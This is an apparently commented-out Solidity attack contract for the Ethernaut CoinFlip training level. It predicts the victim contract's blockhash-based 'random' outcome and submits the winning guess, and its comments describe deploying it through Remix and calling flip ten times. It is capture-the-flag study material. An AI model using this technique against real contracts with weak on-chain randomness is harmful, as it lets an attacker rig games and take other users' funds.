/*
pragma solidity 0.5.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {

    CoinFlip public victimContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimAddress) public {
        victimContract = CoinFlip(_victimAddress);
    }

    function flip() public returns(bool) {
        uint256 blockVal = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockVal/FACTOR);
        bool side = coinFlip == 1 ? true: false;
        victimContract.flip(side);
    }
}
*/


//Entire file commented to prevent compiler version and import errors. This contract was deployed using remix browser editor.
//Deploy w/ ethernaut victim contract instance address in constructor and call flip 10 times.